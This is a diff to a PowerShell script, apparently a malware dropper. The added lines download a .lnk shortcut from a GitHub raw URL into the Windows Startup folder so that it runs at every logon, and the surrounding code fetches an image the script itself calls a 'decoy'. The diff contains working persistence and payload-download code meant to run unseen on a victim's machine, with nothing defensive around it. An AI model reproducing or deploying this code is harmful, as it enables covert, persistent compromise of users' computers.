@@ -1,4 +1,18 @@
 try {
+    #/// SAVE THE .LNK FILE TO STARTUP FOLDER \\#
+    $lnkUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/lnk-no-img.lnk"
+    $startupFolder = [System.Environment]::GetFolderPath('Startup')  # Get the Startup folder path
+    $lnkPath = "$startupFolder\lnk-no-img.lnk"
+
+    # Download the .lnk file to the Startup folder
+    Invoke-WebRequest -Uri $lnkUrl -OutFile $lnkPath
+
+    if (Test-Path $lnkPath) {
+        Write-Host "[+] .lnk file saved to Startup folder: $lnkPath"
+    } else {
+        Write-Host "[-] Failed to save .lnk file to Startup folder."
+    }
+
     #/// EXECUTE THE SECOND PART OF THE SCRIPT (LOCAL OPERATIONS) \\#
     # Download the image (decoy)
     $imageUrl = "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg"
